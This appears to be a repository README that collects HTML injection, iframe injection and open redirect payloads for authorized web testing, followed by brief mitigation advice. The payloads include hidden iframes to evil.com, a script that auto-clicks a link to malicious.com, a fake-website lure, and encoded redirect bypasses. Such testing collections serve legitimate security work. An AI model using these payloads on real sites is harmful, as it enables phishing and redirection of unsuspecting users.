# HTML-iFrame
Collection of HTML Injection, iFrame Injection, and Open Redirect payloads for educational and authorized security testing.
---

## 📌 Overview

This repository contains a curated collection of payloads related to:

- **HTML Injection**
- **iFrame Injection**
- **Open Redirect**

These payloads are commonly used during **Web Application Security Testing (VAPT)** to validate improper input handling and insufficient output sanitization.

---

## 🧪 HTML Injection Payloads

Basic payloads to test whether HTML input is rendered without sanitization:

```
<b>Test</b>
```
```
<i>Injected</i>
```
```
<h1>HTML Injection</h1>
```
```
<div>Injected Content</div>
```

---

## 🧪 iFrame Injection Payloads

Payloads to test whether iFrame tags are allowed or improperly filtered:
```
<html> <iframe src=https://evil.com/ width=600px height=500 px></iframe> </html>
```
```
<iframe src="https://example.com"></iframe>
```
```
<iframe src="https://example.com" width="0" height="0"></iframe>
```
```
<iframe src="https://example.com" style="display:none"></iframe>
```
---

## 🧪 Open Redirect Payloads

Payloads to test redirection based on user-controlled input:

```
<a href="http://malicious.com" id="redirect">Click here</a>
<script>document.getElementById('redirect').click();</script>
```
```
<h1><font Color=red>Visit Our New WebSite</h1><h3><mark><a href='https://xss.js.org/#/xss02'>https://www.google.com/</a></mark></h3><a href='https://evil.com' target='_blank'>
```
```
https://target.com/redirect?url=https://example.com
```
```
https://target.com/login?next=https://example.com
```
```
https://target.com/redirect?url=%68%74%74%70%73%3A%2F%2Fexample.com
```
```
https://target.com/redirect?url=/\/example.com
```
```
https://target.com/redirect?url=https:example.com
```
---

## ⚠️ Notes

- Payload success depends on **context**, **filters**, and **application logic**.
- Not all payloads indicate a security risk; assess impact carefully.
- Open Redirect issues can enable phishing and user redirection attacks.

---

## 🛡 Mitigation Guidance (High-Level)

- Perform proper input validation
- Apply output encoding based on context
- Restrict allowed HTML tags and attributes
- Validate and whitelist redirect destinations
- Avoid using user input directly in redirects

---

## 📚 References

- OWASP HTML Injection  
- OWASP Open Redirect  
- CWE-79, CWE-601  
